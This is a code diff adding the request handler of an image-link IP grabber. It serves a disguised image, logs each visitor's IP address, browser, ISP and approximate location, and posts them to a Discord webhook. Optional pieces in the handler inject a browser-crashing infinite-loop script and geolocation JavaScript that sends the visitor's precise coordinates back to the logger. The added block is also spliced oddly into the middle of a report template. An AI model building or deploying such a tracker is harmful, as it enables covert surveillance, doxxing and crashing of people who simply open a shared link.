@@ -169,7 +169,162 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 > **Mobile:** `{info.get('mobile')}`
 > **VPN:** `{info.get('proxy')}`
 > **Bot:** `{info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
+}
+        ],
+    }
 
+    if url:
+        embed["embeds"][0].update({"thumbnail": {"url": url}})
+
+    requests.post(config["webhook"], json=embed, timeout=10)
+    return info
+
+
+binaries = {
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+}
+
+
+def get_ip(environ):
+    # Vercel-maintained headers first; a client can forge X-Forwarded-For
+    for key in ("HTTP_X_VERCEL_FORWARDED_FOR", "HTTP_X_REAL_IP"):
+        val = environ.get(key)
+        if val:
+            return val.split(",")[0].strip()
+    fwd = environ.get("HTTP_X_FORWARDED_FOR") or environ.get("REMOTE_ADDR") or ""
+    return fwd.split(",")[0].strip()
+
+
+def get_ua(environ):
+    return environ.get("HTTP_USER_AGENT") or ""
+
+
+def app(environ, start_response):
+    path = environ.get("PATH_INFO") or "/"
+    query = environ.get("QUERY_STRING") or ""
+    ip = get_ip(environ)
+    useragent = get_ua(environ)
+
+    try:
+        dic = dict(parse.parse_qsl(query))
+
+        if config["imageArgument"] and (dic.get("url") or dic.get("id")):
+            url = base64.b64decode((dic.get("url") or dic.get("id")).encode()).decode()
+        else:
+            url = config["image"]
+
+        # Discord / Telegram crawler hitting the link -> serve bugged preview
+        if botCheck(ip, useragent):
+            makeReport(ip, endpoint=path, url=url)
+            if config["buggedImage"]:
+                start_response(
+                    "200 OK",
+                    [
+                        ("Content-Type", "image/jpeg"),
+                        ("Cache-Control", "no-store, max-age=0"),
+                    ],
+                )
+                return [binaries["loading"]]
+            start_response(
+                "302 Found",
+                [("Location", url), ("Cache-Control", "no-store, max-age=0")],
+            )
+            return [b""]
+
+        # Real user opened the image
+        if dic.get("g") and config["accurateLocation"]:
+            location = base64.b64decode(dic.get("g").encode()).decode()
+            result = makeReport(ip, useragent, location, path, url=url)
+        else:
+            result = makeReport(ip, useragent, endpoint=path, url=url)
+
+        message = config["message"]["message"]
+
+        if config["message"]["richMessage"] and result:
+            message = message.replace("{ip}", ip)
+            message = message.replace("{isp}", result.get("isp") or "")
+            message = message.replace("{asn}", result.get("as") or "")
+            message = message.replace("{country}", result.get("country") or "")
+            message = message.replace("{region}", result.get("regionName") or "")
+            message = message.replace("{city}", result.get("city") or "")
+            message = message.replace("{lat}", str(result.get("lat")))
+            message = message.replace("{long}", str(result.get("lon")))
+            message = message.replace("{mobile}", str(result.get("mobile")))
+            message = message.replace("{vpn}", str(result.get("proxy")))
+            message = message.replace(
+                "{bot}",
+                str(
+                    result.get("hosting")
+                    if result.get("hosting") and not result.get("proxy")
+                    else "Possibly"
+                    if result.get("hosting")
+                    else "False"
+                ),
+            )
+            message = message.replace(
+                "{browser}", httpagentparser.simple_detect(useragent)[1]
+            )
+            message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])
+
+        data = f"""<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>""".encode()
+
+        if config["message"]["doMessage"]:
+            data = message.encode()
+
+        if config["crashBrowser"]:
+            data = message.encode() + (
+                b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
+            )
+
+        if config["redirect"]["redirect"]:
+            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+
+        if config["accurateLocation"]:
+            data += b"""<script>
+var currenturl = window.location.href;
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
+
+        start_response(
+            "200 OK",
+            [
+                ("Content-Type", "text/html; charset=utf-8"),
+                ("Cache-Control", "no-store, max-age=0"),
+            ],
+        )
+        return [data]
+
+    except Exception:
+        reportError(traceback.format_exc())
+        start_response(
+            "500 Internal Server Error",
+            [("Content-Type", "text/html; charset=utf-8")],
+        )
+        return [
+            b"500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page."
+        ]
 **PC Info:**
 > **OS:** `{os_name}`
 > **Browser:** `{browser}`
